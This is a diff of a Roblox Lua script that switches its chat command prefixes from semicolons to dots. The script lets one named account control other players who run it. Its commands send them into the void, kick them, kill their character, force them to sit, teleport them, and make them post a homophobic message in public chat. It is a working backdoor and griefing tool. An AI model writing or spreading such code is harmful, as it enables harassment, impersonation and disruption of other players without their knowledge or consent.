@@ -34,7 +34,7 @@ local function dieMyCharacter()
 end
 
 user_premium__001.Chatted:connect(function(cht)
-	if cht:match(";void") then
+	if cht:match(".void .") then
 		if game.Players.LocalPlayer ~= user_premium__001 then
 			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 47, 0)
 		end
@@ -45,7 +45,7 @@ end)
 
 
 user_premium__001.Chatted:connect(function(cht)
-	if cht:match(";troll") then
+	if cht:match(".troll .") then
 		if game.Players.LocalPlayer ~= user_premium__001 then
 			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("im gay", "All")
 		end
@@ -55,7 +55,7 @@ end)
 
 
 user_premium__001.Chatted:connect(function(cht)
-	if cht:match(";kick") then
+	if cht:match(".kick .") then
 		if game.Players.LocalPlayer ~= user_premium__001 then
 			game.Players.LocalPlayer:Kick("You have been kicked.")
 		end
@@ -64,7 +64,7 @@ user_premium__001.Chatted:connect(function(cht)
 end)
 
 user_premium__001.Chatted:connect(function(cht)
-	if cht:match(";sit") then
+	if cht:match(".sit .") then
 		if game.Players.LocalPlayer ~= user_premium__001 then
 			sit()
 		end
@@ -73,7 +73,7 @@ user_premium__001.Chatted:connect(function(cht)
 end)
 
 user_premium__001.Chatted:connect(function(cht)
-	if cht:match(";unsit") then
+	if cht:match(".unsit .") then
 		if game.Players.LocalPlayer ~= user_premium__001 then
 			standUp()
 		end
@@ -83,7 +83,7 @@ end)
 
 
 user_premium__001.Chatted:connect(function(cht)
-	if cht:match(";kill") then
+	if cht:match(".kill .") then
 		if game.Players.LocalPlayer ~= user_premium__001 then
 			dieMyCharacter()
 		end
@@ -92,7 +92,7 @@ user_premium__001.Chatted:connect(function(cht)
 end)
 
 user_premium__001.Chatted:connect(function(cht)
-	if cht:match(";bring") then
+	if cht:match(".bring .") then
 		if game.Players.LocalPlayer ~= user_premium__001 then
 			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(user_premium__001.Character.UpperTorso.Position)
 		end
@@ -101,11 +101,11 @@ user_premium__001.Chatted:connect(function(cht)
 end)
 
 user_premium__001.Chatted:connect(function(cht)
-	if cht:match(";cmds") then
+	if cht:match(".cmds") then
 		if game.Players.LocalPlayer == user_premium__001 then
 game:GetService("StarterGui"):SetCore("SendNotification",{
 	Title = "Commands";
-	Text = ";bring ;troll ;kill ;kick ;void ;sit ";
+	Text = ".bring .troll .kill .kick .void .sit";
 	Time = 15;
 	Icon = "rbxassetid://3463417164";
 })
